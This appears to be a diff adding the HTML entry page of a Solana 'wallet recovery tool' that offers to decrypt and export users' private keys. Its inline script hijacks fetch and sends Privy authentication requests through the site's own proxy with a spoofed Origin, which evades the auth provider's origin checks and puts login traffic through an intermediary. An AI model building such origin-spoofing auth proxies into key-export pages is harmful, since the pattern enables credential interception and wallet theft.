@@ -1,0 +1,42 @@
+<!doctype html>
+<html lang="en" class="h-full bg-[#0a0d14] text-slate-100">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>10k.world: Solana Wallet Recovery Tool</title>
+    <meta name="description" content="Cryptographic recovery tool for 10k.world embedded Solana wallets. Connect your original Phantom wallet to safely decrypt and export your private key." />
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%239945FF' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M21 12V7H5a2 2 0 0 1 0-4h14v4'/%3E%3Cpath d='M3 5v14a2 2 0 0 0 2 2h16v-5'/%3E%3Cpath d='M18 12a2 2 0 0 0 0 4h4v-4Z'/%3E%3C/svg%3E" />
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+    <script>
+      // Route Privy API requests through local or Vercel proxy with spoofed Origin: https://10k.world
+      (function() {
+        const originalFetch = window.fetch;
+        window.fetch = function(input, init) {
+          try {
+            const originBase = window.location.origin;
+            if (typeof input === 'string') {
+              if (input.includes('auth.privy.io')) {
+                input = input.replace('https://auth.privy.io', originBase + '/privy-auth');
+              }
+            } else if (input && typeof input === 'object') {
+              const url = input.url || '';
+              if (url.includes('auth.privy.io')) {
+                const newUrl = url.replace('https://auth.privy.io', originBase + '/privy-auth');
+                input = new Request(newUrl, input);
+              }
+            }
+          } catch (e) {
+            console.warn('[Privy Proxy] Fetch rewrite error:', e);
+          }
+          return originalFetch.call(this, input, init);
+        };
+      })();
+    </script>
+  </head>
+  <body class="min-h-full bg-[#0a0d14] text-slate-100 antialiased selection:bg-purple-500/30 selection:text-white">
+    <div id="root"></div>
+    <script type="module" src="/src/main.jsx"></script>
+  </body>
+</html>
